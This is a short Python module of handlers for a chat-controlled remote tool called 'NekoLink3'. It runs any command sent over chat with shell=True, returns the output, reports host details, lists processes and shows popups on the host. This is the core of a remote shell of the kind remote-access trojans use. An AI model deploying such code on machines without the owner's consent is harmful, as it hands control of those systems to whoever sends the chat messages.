import subprocess
import platform
import psutil
from src.utils import show_popup, show_notification, execute_command

def execute_command(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout + result.stderr
        return output[:4000] if output.strip() else "[No output]"
    except:
        return "[Command failed]"

def handle_exec(chat_id, cmd, send_func):
    output = execute_command(cmd)
    send_func(chat_id, f"$ {cmd}\n{output}")

def handle_info(chat_id, send_func):
    info = f"Hostname: {platform.node()}\nOS: {platform.system()} {platform.release()}\nCPU: {psutil.cpu_count()} cores\nRAM: {psutil.virtual_memory().total // (1024**3)} GB"
    send_func(chat_id, info)

def handle_ps(chat_id, send_func):
    output = execute_command("tasklist")
    send_func(chat_id, output[:4000])

def handle_notify(chat_id, msg, send_func):
    show_notification("NekoLink3", msg)
    send_func(chat_id, f"Notification sent: {msg}")

def handle_popup(chat_id, msg, send_func):
    show_popup("NekoLink3 Alert", msg)
    send_func(chat_id, f"Popup sent: {msg}")
